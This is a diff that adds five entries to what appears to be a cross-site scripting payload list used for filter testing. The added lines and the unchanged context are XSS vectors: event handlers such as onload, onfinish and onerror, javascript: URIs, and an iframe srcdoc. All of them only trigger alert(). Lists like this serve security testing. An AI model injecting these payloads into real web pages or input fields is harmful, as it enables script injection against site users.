@@ -6584,3 +6584,8 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
 </a>//["'`-->]]>]</div>
 <div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<marquee loop=1 width=0 onfinish=alert(1)>
+<marguee/onstart=alert(1)>
+<svg onload=(alert)(1)>
+<script>$=1,alert($)</script>
+<form><button formaction="javascript:alert(1)">
